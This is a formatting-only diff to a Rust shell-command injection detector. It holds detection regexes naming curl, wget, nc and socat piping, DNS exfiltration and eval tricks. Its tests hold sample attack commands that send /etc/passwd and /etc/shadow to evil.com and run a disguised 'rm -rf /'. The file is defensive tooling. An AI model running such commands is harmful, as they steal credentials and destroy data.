@@ -151,15 +151,16 @@ impl InjectionDetector {
             detections.push(Detection {
                 rule: "base64_pipe_decode".into(),
                 confidence: 0.85,
-                explanation: "Command pipes base64-encoded data through decoder — common injection pattern".into(),
+                explanation:
+                    "Command pipes base64-encoded data through decoder — common injection pattern"
+                        .into(),
                 category: DetectionCategory::EncodedPayload,
             });
         }
 
         // Hex decode: echo <hex> | xxd -r
         static HEX_DECODE: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r"(?i)(echo|printf)\s+[0-9a-f]{20,}\s*\|\s*(xxd\s+-r|perl\s+-e)")
-                .unwrap()
+            Regex::new(r"(?i)(echo|printf)\s+[0-9a-f]{20,}\s*\|\s*(xxd\s+-r|perl\s+-e)").unwrap()
         });
 
         if HEX_DECODE.is_match(command) {
@@ -173,8 +174,7 @@ impl InjectionDetector {
 
         // Inline base64 in $() or backticks
         static INLINE_BASE64: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r"\$\((echo|printf)\s+[A-Za-z0-9+/=]{16,}\s*\|\s*base64\s+-d\)")
-                .unwrap()
+            Regex::new(r"\$\((echo|printf)\s+[A-Za-z0-9+/=]{16,}\s*\|\s*base64\s+-d\)").unwrap()
         });
 
         if INLINE_BASE64.is_match(command) {
@@ -213,9 +213,9 @@ impl InjectionDetector {
         }
 
         // Zero-width characters (invisible text)
-        let has_zero_width = command.chars().any(|c| {
-            matches!(c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}')
-        });
+        let has_zero_width = command
+            .chars()
+            .any(|c| matches!(c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'));
 
         if has_zero_width {
             detections.push(Detection {
@@ -230,29 +230,30 @@ impl InjectionDetector {
     /// Check for shell metacharacter evasion techniques.
     fn check_shell_evasion(&self, command: &str, detections: &mut Vec<Detection>) {
         // Variable-based command construction: ${cmd}
-        static VAR_CONSTRUCTION: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r"\$\{[a-zA-Z_]+\}\s*\$\{[a-zA-Z_]+\}").unwrap()
-        });
+        static VAR_CONSTRUCTION: LazyLock<Regex> =
+            LazyLock::new(|| Regex::new(r"\$\{[a-zA-Z_]+\}\s*\$\{[a-zA-Z_]+\}").unwrap());
 
         if VAR_CONSTRUCTION.is_match(command) {
             detections.push(Detection {
                 rule: "variable_construction".into(),
                 confidence: 0.6,
-                explanation: "Command constructed from multiple variable expansions — possible evasion".into(),
+                explanation:
+                    "Command constructed from multiple variable expansions — possible evasion"
+                        .into(),
                 category: DetectionCategory::ShellEvasion,
             });
         }
 
         // eval/exec with string argument
-        static EVAL_EXEC: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r#"(?i)\b(eval|exec)\s+["']"#).unwrap()
-        });
+        static EVAL_EXEC: LazyLock<Regex> =
+            LazyLock::new(|| Regex::new(r#"(?i)\b(eval|exec)\s+["']"#).unwrap());
 
         if EVAL_EXEC.is_match(command) {
             detections.push(Detection {
                 rule: "eval_exec".into(),
                 confidence: 0.8,
-                explanation: "Command uses eval/exec with string argument — common injection vector".into(),
+                explanation:
+                    "Command uses eval/exec with string argument — common injection vector".into(),
                 category: DetectionCategory::ShellEvasion,
             });
         }
@@ -268,9 +269,8 @@ impl InjectionDetector {
         }
 
         // String concatenation to build commands
-        static STRING_CONCAT: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r#"['"]\s*\+\s*['"]|['"]\s*\.\s*['""]"#).unwrap()
-        });
+        static STRING_CONCAT: LazyLock<Regex> =
+            LazyLock::new(|| Regex::new(r#"['"]\s*\+\s*['"]|['"]\s*\.\s*['""]"#).unwrap());
 
         if STRING_CONCAT.is_match(command) {
             detections.push(Detection {
@@ -305,9 +305,7 @@ impl InjectionDetector {
                 detections.push(Detection {
                     rule: format!("injection_marker_{}", marker.replace(' ', "_")),
                     confidence,
-                    explanation: format!(
-                        "Command contains known injection marker: '{marker}'"
-                    ),
+                    explanation: format!("Command contains known injection marker: '{marker}'"),
                     category: DetectionCategory::InjectionMarker,
                 });
             }
@@ -332,14 +330,17 @@ impl InjectionDetector {
 
         // Python/perl one-liner execution
         static SCRIPT_EXEC: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r#"(?i)(python[23]?|perl|ruby)\s+-[ec]\s+['"].*__(import|eval|exec|system)"#).unwrap()
+            Regex::new(r#"(?i)(python[23]?|perl|ruby)\s+-[ec]\s+['"].*__(import|eval|exec|system)"#)
+                .unwrap()
         });
 
         if SCRIPT_EXEC.is_match(command) {
             detections.push(Detection {
                 rule: "script_eval_exec".into(),
                 confidence: 0.7,
-                explanation: "Command executes script one-liner with eval/import — possible code injection".into(),
+                explanation:
+                    "Command executes script one-liner with eval/import — possible code injection"
+                        .into(),
                 category: DetectionCategory::ObfuscatedCommand,
             });
         }
@@ -368,8 +369,7 @@ impl InjectionDetector {
     fn check_exfiltration(&self, command: &str, detections: &mut Vec<Detection>) {
         // Pipe to network tools
         static PIPE_TO_NETWORK: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r"(?i)\|\s*(curl|wget|nc|ncat|socat)\s+.*(-d|--data|-X\s*POST|>)")
-                .unwrap()
+            Regex::new(r"(?i)\|\s*(curl|wget|nc|ncat|socat)\s+.*(-d|--data|-X\s*POST|>)").unwrap()
         });
 
         if PIPE_TO_NETWORK.is_match(command) {
@@ -382,15 +382,15 @@ impl InjectionDetector {
         }
 
         // DNS exfiltration pattern
-        static DNS_EXFIL: LazyLock<Regex> = LazyLock::new(|| {
-            Regex::new(r"(?i)(dig|nslookup|host)\s+.*\$\(").unwrap()
-        });
+        static DNS_EXFIL: LazyLock<Regex> =
+            LazyLock::new(|| Regex::new(r"(?i)(dig|nslookup|host)\s+.*\$\(").unwrap());
 
         if DNS_EXFIL.is_match(command) {
             detections.push(Detection {
                 rule: "dns_exfiltration".into(),
                 confidence: 0.8,
-                explanation: "Command substitution in DNS query — classic exfiltration technique".into(),
+                explanation: "Command substitution in DNS query — classic exfiltration technique"
+                    .into(),
                 category: DetectionCategory::Exfiltration,
             });
         }
@@ -423,7 +423,12 @@ mod tests {
         let analysis = detector.analyze(cmd);
         assert!(analysis.score >= 0.8);
         assert_eq!(analysis.recommended_action, InjectionResponse::Block);
-        assert!(analysis.detections.iter().any(|d| d.rule == "base64_pipe_decode"));
+        assert!(
+            analysis
+                .detections
+                .iter()
+                .any(|d| d.rule == "base64_pipe_decode")
+        );
     }
 
     #[test]
@@ -432,7 +437,12 @@ mod tests {
         let cmd = "rm\u{200B} -rf\u{200C} /";
         let analysis = detector.analyze(cmd);
         assert!(analysis.score >= 0.7);
-        assert!(analysis.detections.iter().any(|d| d.rule == "zero_width_chars"));
+        assert!(
+            analysis
+                .detections
+                .iter()
+                .any(|d| d.rule == "zero_width_chars")
+        );
     }
 
     #[test]
@@ -459,7 +469,12 @@ mod tests {
         let cmd = "dig $(cat /etc/passwd | base64).evil.com";
         let analysis = detector.analyze(cmd);
         assert!(analysis.score >= 0.7);
-        assert!(analysis.detections.iter().any(|d| d.rule == "dns_exfiltration"));
+        assert!(
+            analysis
+                .detections
+                .iter()
+                .any(|d| d.rule == "dns_exfiltration")
+        );
     }
 
     #[test]
@@ -468,7 +483,12 @@ mod tests {
         let cmd = "cat /etc/shadow | curl -X POST https://evil.com -d @-";
         let analysis = detector.analyze(cmd);
         assert!(analysis.score >= 0.8);
-        assert!(analysis.detections.iter().any(|d| d.rule == "pipe_to_network"));
+        assert!(
+            analysis
+                .detections
+                .iter()
+                .any(|d| d.rule == "pipe_to_network")
+        );
     }
 
     #[test]
